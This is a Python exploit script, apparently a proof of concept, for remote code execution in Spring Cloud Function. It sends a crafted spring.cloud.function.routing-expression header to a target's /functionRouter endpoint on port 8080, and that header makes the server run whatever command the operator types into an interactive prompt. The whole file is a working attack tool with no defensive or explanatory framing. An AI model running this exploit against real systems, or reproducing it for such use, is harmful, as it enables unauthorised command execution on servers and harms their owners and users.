import os
import sys
from colorama import Fore, Style

def rce(payload, ip):
	command = f"""curl -q -X POST http://{ip}:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("{payload}")' --data-raw 'data'"""
	print(Fore.BLUE + f"""[+] Full command: {command}""" + Style.RESET_ALL)
	os.system(command)
	print(Fore.GREEN + "\n[+] Payload Sent!" + Style.RESET_ALL)

def main():
	if len(sys.argv) != 2:
		print(Fore.RED + "[-] Usage: springcloud_rce.py <IP>" + Style.RESET_ALL)
		exit(0)

	ip = sys.argv[1]
	while True:
		payload = input(Fore.BLUE + "[+] Payload to execute>> " + Style.RESET_ALL)
		if (payload == "exit"):
			print(Fore.BLUE + "Bye!!" + Style.RESET_ALL)
			exit(0)
		rce(payload, ip)

if __name__ == "__main__":
	main()
